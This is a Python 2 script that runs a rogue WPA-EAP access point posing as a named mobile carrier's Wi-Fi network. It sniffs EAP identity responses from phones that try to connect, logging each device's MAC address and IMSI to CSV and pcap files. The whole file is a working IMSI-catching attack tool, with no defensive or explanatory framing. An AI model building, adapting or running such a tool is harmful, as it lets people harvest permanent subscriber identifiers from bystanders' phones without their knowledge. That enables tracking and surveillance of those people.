import os
from scapy.all import *
import keyboard
import time
import threading
from prettytable import PrettyTable
end_cap = False
my_imsi = None

# working networks: HOTmobile


def stop_capture(p):
    return end_cap


def on_press_reaction(event):
    global end_cap
    if event.name == 'ctrl':
        my_imsi.save()
        os.system('pkill hostapd')
        os.system("pgrep -a python | grep imsi | awk '{print $1}' | xargs kill -9")
        exit()


class ImsiExtractor(object):

    def __init__(self, ssids, interface):
        keyboard.on_press(on_press_reaction)
        if len(ssids) >8:
            print '[!] Max SSIDS allowed: 8'
            exit()
        self.ssids = ssids
        self.attempted_associations = []
        self.interface = interface
        self.imsi_packets = []
        self.mac_to_imsi = {}
        self.ap_starter = threading.Thread(target=self.start_ap)
        self.sniffer = threading.Thread(target=self.check_for_connections)

    def create_trap(self):
        with open('hostapd_ex.conf', 'w') as nf:
            nf.write('interface={}\n'.format(self.interface))
            nf.write('bssid=02:ab:cd:ef:12:30\n')
            nf.write('driver=nl80211\n')
            nf.write('ieee8021x=1\n')
            nf.write('eapol_key_index_workaround=0\n')
            nf.write('own_ip_addr=127.0.0.1\n')
            nf.write('auth_server_addr=127.0.0.1\n')
            nf.write('auth_server_port=1812\n')
            nf.write('auth_server_shared_secret=testing123\n')
            nf.write('wpa=2\n')
            nf.write('wpa_key_mgmt=WPA-EAP\n')
            nf.write('channel=1\n')
            nf.write('wpa_pairwise=TKIP CCMP\n')
            nf.write('ssid={0}\n'.format(self.ssids[0]))
            for i in range(1, len(self.ssids)):
                nf.write('bss={0}_{1}\n'.format(self.interface, i-1))
                nf.write('ssid={0}\n'.format(self.ssids[i]))
                nf.write('ieee8021x=1\n')
                nf.write('eapol_key_index_workaround=0\n')
                nf.write('own_ip_addr=127.0.0.1\n')
                nf.write('auth_server_addr=127.0.0.1\n')
                nf.write('auth_server_port=1812\n')
                nf.write('auth_server_shared_secret=testing123\n')
                nf.write('wpa=2\n')
                nf.write('wpa_key_mgmt=WPA-EAP\n')
                nf.write('wpa_pairwise=TKIP CCMP\n')


    def imsi_checker(self, packet):
        if packet.haslayer('EAP'):
            if packet.code == 2:
                if packet.src not in self.mac_to_imsi.keys():
                    #print '[+] Received IMSI!'
                    self.imsi_packets.append(packet)
                    self.mac_to_imsi[packet.src] = packet.identity[0:16]
                    self.show()

                    #print '     {0} --> {1}'.format(packet.src, packet.identity[0:16])


    def check_for_connections(self):
        print '[+] Started Capturing'
        sniff(prn=self.imsi_checker)


    def show(self):
        os.system('clear')
        t = PrettyTable(['MAC','IMSI'])
        for key, value in self.mac_to_imsi.items():
            t.add_row([key, value])
        print t


    def start_ap(self):
        print '[+] started Ap'
        os.system('ifconfig {0} up'.format(self.interface))
	#os.system('hostapd hostapd_ex.conf')
        command1 = "xterm -geometry 100x40+1000+0 -e bash -c '{}'".format('hostapd hostapd_ex.conf')
        os.system(command1)

    def save(self):
        for key,value in self.mac_to_imsi.items():
            with open('imsi-mac.csv','a+') as nf:
                nf.write(key+','+str(value)+'\n')
        try:
            old_packets = rdpcap('imsi_mac.pcap')
            self.imsi_packets += old_packets
        except:
            pass
        wrpcap('imsi_mac.pcap',self.imsi_packets)

my_imsi = ImsiExtractor(['HOTmobile'],'wlp3s0')
my_imsi.create_trap()
my_imsi.ap_starter.start()
time.sleep(5)
my_imsi.check_for_connections()
my_imsi.save()
